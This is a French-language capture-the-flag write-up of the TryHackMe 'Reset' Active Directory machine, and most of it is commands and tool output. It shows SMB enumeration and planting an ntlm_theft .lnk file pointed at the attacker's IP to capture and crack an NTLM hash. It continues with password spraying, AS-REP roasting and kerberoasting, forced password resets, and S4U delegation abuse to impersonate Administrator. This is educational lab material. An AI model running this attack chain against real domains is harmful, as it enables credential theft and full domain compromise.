---
title: reset-thm
date: 2024-04-08 06:00:01 +0000
description: maximum 155 char description
categories: [Hacking for Beginners]
tags: [HTB, CTFs, Hacking]
image:
    path:
---


- **[The Best Academy to Learn Hacking](https://affiliate.hackthebox.com/nenandjabhata)**.
- **[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.


## Reconnaissance

```sh
# /home/blo/tools/nmapautomate/nmapauto.sh $ip

###############################################
###---------) Starting Quick Scan (---------###
###############################################

Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 25.39 seconds
           Raw packets sent: 2001 (88.020KB) | Rcvd: 22 (952B)


----------------------------------------------------------------------------------------------------------
Open Ports : 53,88,135,139,389,445,464,593,636,3268,3269,3389                                                                                                
----------------------------------------------------------------------------------------------------------

Completed NSE at 06:08, 1.29s elapsed
Initiating NSE at 06:08
Completed NSE at 06:08, 0.00s elapsed
Nmap scan report for 10.10.192.62
Host is up (0.61s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
53/tcp    open  tcpwrapped
135/tcp   open  tcpwrapped
139/tcp   open  tcpwrapped
389/tcp   open  tcpwrapped
445/tcp   open  tcpwrapped
593/tcp   open  tcpwrapped
3389/tcp  open  tcpwrapped
49669/tcp open  tcpwrapped
49670/tcp open  tcpwrapped
49676/tcp open  tcpwrapped
49696/tcp open  tcpwrapped
49702/tcp open  tcpwrapped

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.01 seconds
           Raw packets sent: 131117 (5.769MB) | Rcvd: 28 (1.232KB)


----------------------------------------------------------------------------------------------------------
Open Ports : 53,135,139,389,445,593,3389,49669,49670,49676,49696,49702                                                                                       
----------------------------------------------------------------------------------------------------------                                                                                                   
```


second scan sur toutes les ports


```sh
─# nmap -sCV -Pn -p53,135,139,389,445,593,3389,49669,49670,49676,49696,49702,88,636 $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-08 06:09 GMT
Nmap scan report for 10.10.192.62
Host is up (0.62s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-08 06:10:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-04-08T06:11:45+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Not valid before: 2024-01-25T21:01:31
|_Not valid after:  2024-07-26T21:01:31
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-08T06:11:07+00:00
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-08T06:11:06
|_  start_date: N/A


```

- Domain `thm.corp`. Controlleur de Domain `HAYSTACK.thm.corp`

```sh
# echo "$ip  $host $host2" | tee -a /etc/hosts
10.10.192.62  thm.corp HAYSTACK.thm.corp
```

- Les ports SMB et MSRPC sont ouverts
acces anonyme disponible 

```sh
# nxc smb $ip -u '' -p ''                                                             
SMB         10.10.192.62    445    HAYSTACK         [*] Windows 10.0 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         10.10.192.62    445    HAYSTACK         [+] thm.corp\: 

```

```sh
# rpcclient -U '' thm.corp
Password for [WORKGROUP\]:
rpcclient $> enumdomains
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> 
```

```sh
# smbclient -L //10.10.192.62/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
```

```sh
─# smbclient //10.10.192.62/Data -N
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \onboarding\4vrjruvx.tug.txt of size 521 as onboarding/4vrjruvx.tug.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \onboarding\xuejo2gy.jmg.pdf
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \onboarding\zbqm02rb.qad.pdf
smb: \> 

```

Dans le fichier telecharge je trouve un texte qui est :
`Subject: Welcome to Reset -�Dear <USER>,Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login information to access your company account. Please keep this information confidential and do not share it with anyone.The initial passowrd is: ResetMe123! We are confident that you will contribute significantly to our continued success. We look forward to working with you and wish you the very best in your new role.Best regards,The Reset Team `

Bon la je viens de trouver un mot de passe, mais pas assez sur elle. donc je vais essayer de voler un ntlm sur le smb

- [Ntml theft](https://github.com/Greenwolf/ntlm_theft)

```sh
─# python3 ntlm_theft.py -g lnk -s 10.4.65.5 -f hacked
Created: hacked/hacked.lnk (BROWSE TO FOLDER)
Generation Complete.


# smbclient //10.10.82.22/Data -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 19 08:40:57 2023
  ..                                  D        0  Wed Jul 19 08:40:57 2023
  onboarding                          D        0  Wed Apr 10 00:38:40 2024
cd on
                7863807 blocks of size 4096. 3000269 blocks available
smb: \> cd onboarding\
smb: \onboarding\> put hacked.lnk 
putting file hacked.lnk as \onboarding\hacked.lnk (0.9 kb/s) (average 0.9 kb/s)
smb: \onboarding\> 


# responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
[+] Listening for events...                                                                  

[SMB] NTLMv2-SSP Client   : 10.10.82.22
[SMB] NTLMv2-SSP Username : THM\AUTOMATE
[SMB] NTLMv2-SSP Hash     : AUTOMATE::THM:ffe29998b3aa658b:D123528118DB66318956D28739DA7636:010100000000000080AF023CDF8ADA01958DE41AC76F6B9000000000020008004B0051005000570001001E00570049004E002D004200570038004F004D0033003600410052005000350004003400570049004E002D004200570038004F004D003300360041005200500035002E004B005100500057002E004C004F00430041004C00030014004B005100500057002E004C004F00430041004C00050014004B005100500057002E004C004F00430041004C000700080080AF023CDF8ADA01060004000200000008003000300000000000000001000000002000004C7E220F098EC446D856C8D9F3893125C66A61FB068B9F3D972F9B400D508F1F0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0034002E00360035002E0035000000000000000000
```

Je viens d'avoir un hash de `automate`, maintenant je dois le cracker

```sh
─# hashid hash.txt
--File 'hash.txt'--
Analyzing 'AUTOMATE::THM:ffe29998b3aa658b:D123528118DB66318956D28739DA7636:010100000000000080AF023CDF8ADA01958DE41AC76F6B9000000000020008004B0051005000570001001E00570049004E002D004200570038004F004D0033003600410052005000350004003400570049004E002D004200570038004F004D003300360041005200500035002E004B005100500057002E004C004F00430041004C00030014004B005100500057002E004C004F00430041004C00050014004B005100500057002E004C004F00430041004C000700080080AF023CDF8ADA01060004000200000008003000300000000000000001000000002000004C7E220F098EC446D856C8D9F3893125C66A61FB068B9F3D972F9B400D508F1F0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0034002E00360035002E0035000000000000000000'
[+] NetNTLMv2 

# hashcat -h | grep "NetNTLMv2"
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol

  └─# hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt 
Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344387
* Bytes.....: 139921519
* Keyspace..: 14344387

AUTOMATE::THM:ffe29998b3aa658b:d123528118db66318956d28739da7636:010100000000000080af023cdf8ada01958de41ac76f6b9000000000020008004b0051005000570001001e00570049004e002d004200570038004f004d0033003600410052005000350004003400570049004e002d004200570038004f004d003300360041005200500035002e004b005100500057002e004c004f00430041004c00030014004b005100500057002e004c004f00430041004c00050014004b005100500057002e004c004f00430041004c000700080080af023cdf8ada01060004000200000008003000300000000000000001000000002000004c7e220f098ec446d856c8d9f3893125c66a61fb068b9f3d972f9b400d508f1f0a0010000000000000000000000000000000000009001c0063006900660073002f00310030002e0034002e00360035002e0035000000000000000000:Passw0rd1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: AUTOMATE::THM:ffe29998b3aa658b:d123528118db66318956...000000
Time.Started.....: Wed Apr 10 00:45:07 2024 (0 secs)
Time.Estimated...: Wed Apr 10 00:45:07 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1721.4 kH/s (1.37ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 229376/14344387 (1.60%)
Rejected.........: 0/229376 (0.00%)
Restore.Point....: 225280/14344387 (1.57%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: astoria1 -> 17022526
Hardware.Mon.#1..: Temp: 35c Util: 19%

```

Verification

```sh
─# nxc smb $ip -u 'AUTOMATE' -p 'Passw0rd1' --pass-pol
SMB         10.10.82.22     445    HAYSTACK         [*] Windows 10.0 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         10.10.82.22     445    HAYSTACK         [+] thm.corp\AUTOMATE:Passw0rd1 
```

## Privilege Escalation

```sh
─# rpcclient -U 'AUTOMATE%Passw0rd1' thm.corp
rpcclient $> enumdomains
name:[THM] idx:[0x0]
name:[Builtin] idx:[0x0]
rpcclient $> 
└─# rpcclient -U 'AUTOMATE%Passw0rd1' thm.corp -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d [] > reset_users 
Administrator
Guest
krbtgt
3091731410SA
ERNESTO_SILVA

```

Maintenant comme j'avais deja trouver un mot de passe qui est : `ResetMe123!` alors je vais faire du `passwordspraying` de tout ces users

```sh
─# nxc smb $ip -u reset_users -p 'ResetMe123!' 
SMB         10.10.82.22     445    HAYSTACK         [*] Windows 10.0 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         10.10.82.22     445    HAYSTACK         [-] thm.corp\Administrator:ResetMe123! STATUS_ACCOUNT_RESTRICTION 
SMB         10.10.82.22     445    HAYSTACK         [-] thm.corp\Guest:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.10.82.22     445    HAYSTACK         [-] thm.corp\krbtgt:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.10.82.22     445    HAYSTACK         [-] thm.corp\LINDSAY_SCHULTZ:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.10.82.22     445    HAYSTACK         [-] thm.corp\TABATHA_BRITT:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.10.82.22     445    HAYSTACK         [-] thm.corp\RICO_PEARSON:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.10.82.22     445    HAYSTACK         [-] thm.corp\DARLA_WINTERS:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.10.82.22     445    HAYSTACK         [-] thm.corp\ANDY_BLACKWELL:ResetMe123! STATUS_LOGON_FAILURE 
SMB         10.10.82.22     445    HAYSTACK         [+] thm.corp\LILY_ONEILL:ResetMe123! 
```

Je trouve que le dernier utilisateur detient ce mot de passe

### Kerberoasting
Je vais alors essayer de faire du Kerberoasting 

```sh
# impacket-GetNPUsers thm.corp/AUTOMATE:Passw0rd1 -dc-ip 10.10.82.22 -k -request 
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[*] Getting machine hostname
[-] CCache file is not found. Skipping...
Name           MemberOf                                                      PasswordLastSet             LastLogon                   UAC      
-------------  ------------------------------------------------------------  --------------------------  --------------------------  --------
ERNESTO_SILVA  CN=Gu-gerardway-distlist1,OU=AWS,OU=Stage,DC=thm,DC=corp      2023-07-18 16:21:44.224354  2024-04-10 00:59:10.193932  0x410200 
TABATHA_BRITT  CN=Gu-gerardway-distlist1,OU=AWS,OU=Stage,DC=thm,DC=corp      2023-08-21 20:32:59.571306  2024-04-10 00:59:11.818883  0x410200 
LEANN_LONG     CN=CH-ecu-distlist1,OU=Groups,OU=OGC,OU=Stage,DC=thm,DC=corp  2023-07-18 16:21:44.161807  2024-04-10 00:59:14.163918  0x410200 



$krb5asrep$23$ERNESTO_SILVA@THM.CORP:077a30cde3c1639108ae14320bfc08b3$bfba9d64b5dcffda8254be60b31e446d13adf56b1b9f7d26e8b99286fa8ea8fb96ec90067a5bba045429079a4d89196ddd6da37ded5437453e28211f09e2a0ade3297d844265f1287fad8481667517278afc4e5b1cc75d547091197039a50750412893873006a868f069baefaa20fa998b1279a74500b2f598c09cd3285f282b63dc8f10b68b0d585ca40a288de4a5fb97379d8606edea90fd04482777b194bb063e24e7effba4e683e1a6534851f0cf800906c96b047068bd48ae411945c86cce9f3f2a077573af1986bd51829b22b232321c86c143bafa6596385bb6473a27e9a0aa29
$krb5asrep$23$TABATHA_BRITT@THM.CORP:c5c6903c27089103243438467a309bff$17b96c13d88153fe46a5cb7c5624653b4198ab7ccf9b21757ef8aa4c6b54e55674ed46ebaed0bbbe3f78eb9ec18e8828191edbaf8a7b148a8db3d3eb34247246eaf1451f71582b1cfb8f00bab1944d94c237f51261ef270bc91498071ece84cb8e6785c471750414161cfbaea27d17850980bd57f11195243890471e8f0735d46971058ba0170550e53b15ff840df43d36f96b96389f79a3c71364842c6894bc09aebfc59f4d7068009907eb218d53a319d0a16595a17c096ec612bd1c9e0fdf6aa7f722d213443c61b89cfd7e9f4a350013b055d148a6414b3341ed9305e2501efe23ae
$krb5asrep$23$LEANN_LONG@THM.CORP:78d050a27f915386dce878fb9da6f953$f3ce29bad9404e170be0a52068a2e2f49e42aa7d19a14f827574b072f6216fd12c1f1e7a84762056b1c750ec25108eb4065a36de887d917b5702578f50f47bbcd86942183805104478d007939728020fd98778a95fef68df60055ab943b7d6e426bd7d565f4ecf11d7ad8ef8664ec0749db52d23c47b1eeae15d4725c00a648e692195291bd9d08a10b8af93459acff15905eb17ac292fe522ec323d53920a44258b3734cc5d9fdba9edcd35bec76dd4cb74dcbbae5eff0db63aba28af144d6a1d167654aa921e2339814da2600f0c19b4b9c69e812c0a1aa372ec22b62307489a7b2393
                                               
─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:03 16.04% (ETA: 01:18:24) 0g/s 828631p/s 2487Kc/s 2487KC/s zaylah6..zarwatun
0g 0:00:00:05 28.10% (ETA: 01:18:23) 0g/s 832609p/s 2497Kc/s 2497KC/s rodrigoaderly..rodeo1975
marlboro(1985)   ($krb5asrep$23$TABATHA_BRITT@THM.CORP) 
```

Pas assez de truc decouvert, donc je vais utiliser `bloodhound` voir si y'as des path pour atteindre le domain admin

Je trouve que je peux modifier le mot de passe d'un utilisateur
```sh

└─# net rpc password "SHAWNA_BRAY" "Password1" -U "thm.corp"/"TABATHA_BRITT"%"marlboro(1985)" -S "HAYSTACK.thm.corp"
# nxc smb thm.corp -u 'SHAWNA_BRAY' -p 'Password1'
SMB         10.10.82.22     445    HAYSTACK         [*] Windows 10.0 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:False)
SMB         10.10.82.22     445    HAYSTACK         [+] thm.corp\SHAWNA_BRAY:Password1 

```

ensuite avec cet utilisateur changer le mot de passe d'un autre utilisateur CAR (The user SHAWNA_BRAY@THM.CORP has the capability to change the user CRUZ_HALL@THM.CORP's password without knowing that user's current password.)

```sh
└─# net rpc password "CRUZ_HALL" "Password1" -U "thm.corp"/"SHAWNA_BRAY"%"Password1" -S "HAYSTACK.thm.corp"


```

The user CRUZ_HALL@THM.CORP has generic write access to the user DARLA_WINTERS@THM.CORP.(Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user)

- A targeted kerberoast attack can be performed using `targetedKerberoast.py`
```sh
# python3 targetedKerberoast.py -v -d 'thm.corp' -u 'CRUZ_HALL' -p 'Password1'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (DARLA_WINTERS)
$krb5tgs$23$*DARLA_WINTERS$THM.CORP$thm.corp/DARLA_WINTERS*$5abc72c33e8c09482ca34af8935d6793$b39467253415313c0698323c185c3b0e88963b0a604cd97bd98a6d0ef1dcb8e77f8d2aa951625ea95f0e60e9adbabf21ba3e448f48908e3f4009edf4cb4e42cefb95d4c300fca72f74dee2bc8f6322b65ea937d427ea96a7687fba29df72e9ed061ebdf48ed337f6d0bf57a8bd1dc08785e1ce695314f3f938f7e6b67e5c3c6c956551464b052540997a10a4fc2476ed75369b523c9612f42b569003a16ff41626aa10c5167ca85312e954ffe04016e687b22875aa06dd2d9e735301174be5f0a4652f11833b5b33608c7eebb5ec698f5a19384d99d48bb217226ce3415bdd5677b7ac7067aedaa529a317c5be14bd18e2555fe3e1df3653cdd5f60021b6b3fe3d8f7f359bf8954038376c8b56043a703ed25253dc383f3d88206d0ba239216acdc7e88b6b3a6809c0c5c3cdf984a20d847708e6d1cdcd88b90b55ff32297a1483360cefd6462987f65520e1cced094bda14d6467724f0bf4d01c5c7537d548fbb1ab4f82e70b010919f037d0ec540b911ef03253425eefbe900395cc049a4779deb96b0dc069951417957e02128c3ebc62c52d79b0ed340ce5a4d9ca61f98c85f22796e6a010d9fc0408ef56cdd7cc606f3dfc4371bfcb9c24a1c65adca759201c9b4e98344884940fb70345326aba8429180a7c9b2cd3406996c837b8c54ed02476cf496cac10becb04d7d4018052dd08fe9ada129ea7704bb4d1c18f6212e25c6a91437c7ba5a29cf0306a4d611e705f320f416010f680f9d22899fcf665666fbadf7e23b23c82e130dc518ace8bb8f96382cd1904cb9274ef297eb8ad359a49c96420afd6ff487843d2c8cda3793d89f194976d674f24cce08fee10ad108a9c240d3cce54d99c5aa7f549e989422dd79006dd31c2e6edde580e9789a2d8a5b7ec662383865344ab7f59755d7f343574d89c165374a1035b3657f32b4fa09e649d7757fc7dfbb20cdd0095f818b72d04dd109a8346ff7314760748b251b0fa0ebf3446ba0502f744bdd3a1e38c3e164432c8993142646b5ffb83c05a6b109464971c8622dc5a79c6777f3934912432170781a7dca73229e1c8fd5302eda40e6c186543dbef1227cb2b2ea0648a42b5b03322c3d0d0fab838457c892b2c7b767716cc135574698d54b1cfc83a6b31a99f5c5de5c95e4ce5ddb17de8fea4f64e0c0b3db454beee7caee87921d6938c1b87c2a07035a8033abc0295a554dc05323b54c14e97807bd0a653bf2482e44d34893b972baa45a2d7612b2033e15c9d64d32fbebaf766b764a75388aeca78f0003e2be2a172f3a310e9cb22e999ff9edaf9dd012b0c1d6f1ef863b397011687dd0d04811a3b516e4b19f8ee4584742bade978d04ed69a02a0b37270d56c026e538a433ee54fe6fec16fb0d2660437239286f9cc65849d8b0e0379799926e1950a71e303f0be2fa0780b31a191b9f0847a780381f87aa700c1beb2dd56657009c17ed7d49622c27c0e90dcf33664c76edef5ca8fae871e265a8011dd0978907cd8cc8de36d08d11b01ae2
```

Ca ne se crack pas. donc utilisons la meme methode pour lui creer un mot de passe car il a un `GenericWrite`

```sh
└─# net rpc password "DARLA_WINTERS" "Password1" -U "thm.corp"/"CRUZ_HALL"%"Password1" -S "HAYSTACK.thm.corp"

# impacket-getST -spn 'cifs/HayStack.thm.corp' -impersonate 'Administrator' 'thm.corp/DARLA_WINTERS:Password1' 
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache

```

maintenant se connecter avec le `.ccache`

```sh
# export KRB5CCNAME=Administrator.ccache
                                                                                                                          
┌──(root㉿xXxX)-[/home/blo/CTFs/Boot2root/TryHackMe]
└─# impacket-wmiexec -k -no-pass Administrator@haystack.thm.corp
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra
C:\>whoami
thm\administrator
 Directory of C:\users\Administrator\desktop

07/14/2023  07:23 AM    <DIR>          .
07/14/2023  07:23 AM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
06/16/2023  04:37 PM                30 root.txt
               3 File(s)          1,111 bytes
               2 Dir(s)  12,406,370,304 bytes free

C:\users\Administrator\desktop>type root.txt
THM{RE_RE_RE_SET_AND_DELEGATE}
C:\users\automate\desktop>type user.txt
THM{AUTOMATION_WILL_REPLACE_US}

```






## Ressources supplementaires
Voici quelques ressources supplémentaires qui pourraient vous être utiles :
[]()
[]()
- [Join Us on Discord](https://discord.gg/wBT9wr9ruG).
